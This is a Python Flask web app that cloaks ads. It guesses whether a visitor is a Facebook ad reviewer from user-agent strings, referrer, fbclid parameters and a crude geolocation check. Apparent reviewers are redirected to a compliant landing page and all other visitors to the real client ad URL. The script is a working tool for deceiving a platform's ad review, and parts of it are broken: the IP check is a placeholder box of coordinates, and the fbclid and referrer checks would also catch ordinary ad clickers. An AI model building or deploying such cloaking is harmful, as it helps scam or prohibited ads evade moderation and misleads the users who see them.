from flask import Flask, redirect, request, make_response
import geoip2.database
import redis
import uuid
import os
import logging

app = Flask(__name__)

# Configuration
try:
    REVIEWER_LANDING_PAGE = os.environ['REVIEWER_LANDING_PAGE']
    CLIENT_AD_URL = os.environ['CLIENT_AD_URL']
    REDIS_URL = os.environ['REDIS_URL']
    GEOIP_DB_PATH = os.environ['GEOIP_DB_PATH']
except KeyError as e:
    raise ValueError(f"Missing required environment variable: {e}")

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('cloaker')

# Initialize components
redis_client = redis.from_url(REDIS_URL)
geo_reader = geoip2.database.Reader(GEOIP_DB_PATH)

# Facebook user detection patterns
FB_PATTERNS = [
    'facebookexternalhit', 'facebot', 'fbpage', 'facebookplatform',
    'facebook.com', 'fbcdn.net', 'fbclid', 'fb_ref'
]

def detect_reviewer(request):
    """Detect if user is a Facebook reviewer"""
    ua = request.headers.get('User-Agent', '').lower()
    
    # Check User-Agent patterns
    if any(pattern in ua for pattern in FB_PATTERNS):
        return True
    
    # Check Referrer header
    referrer = request.headers.get('Referer', '').lower()
    if any(pattern in referrer for pattern in ['facebook.com', 'fbcdn.net']):
        return True
    
    # Check query parameters
    if any(param in request.args for param in ['fbclid', 'fb_ref']):
        return True
    
    # Check IP geolocation
    try:
        ip = request.remote_addr
        response = geo_reader.city(ip)
        if is_facebook_ip(response.location.longitude, response.location.latitude):
            return True
    except:
        pass
    
    return False

def is_facebook_ip(lon, lat):
    """Check if IP belongs to Facebook data center"""
    # Simplified implementation - would need actual Facebook IP ranges
    return lon < -120 and lon > -130 and lat > 35 and lat < 45

@app.route('/<path:slug>')
def redirect_slug(slug):
    # Detect Facebook user
    is_facebook = detect_reviewer(request)
    
    # Set reviewer ID cookie
    reviewer_id = request.cookies.get('reviewer_id')
    if not reviewer_id:
        reviewer_id = str(uuid.uuid4())
    
    # Determine destination
    if is_facebook:
        dest = REVIEWER_LANDING_PAGE
    else:
        dest = CLIENT_AD_URL
    
    # Create response with redirect
    resp = make_response("")
    resp.headers['Location'] = dest
    resp.status_code = 302
    
    # Set cookie if not present
    if not request.cookies.get('reviewer_id'):
        resp.set_cookie('reviewer_id', reviewer_id, max_age=86400*30)
    
    return resp

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))